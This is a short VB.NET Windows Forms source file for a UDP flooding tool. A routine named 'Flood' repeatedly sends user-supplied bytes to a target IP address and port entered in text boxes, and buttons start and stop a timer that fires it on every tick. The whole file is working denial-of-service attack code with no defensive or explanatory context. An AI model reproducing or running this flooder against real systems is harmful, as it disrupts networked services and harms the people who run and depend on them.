Imports System.Net.Sockets
Imports System.Net
Imports System.Text
Imports System.Data

Public Class Form1

    Sub Flood()

        Dim newByte As Byte() = New Byte() {}
        Dim Ip_address As IPAddress
        Dim Udpuser As New UdpClient
        Ip_address = IPAddress.Parse(TextBox1.Text)
        Udpuser.Connect(Ip_address, TextBox2.Text)
        newByte = Encoding.ASCII.GetBytes(TextBox3.Text)
        Udpuser.Send(newByte, newByte.Length)

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load



    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Timer1.Enabled = True
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Timer1.Enabled = False
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        Flood()

    End Sub
End Class
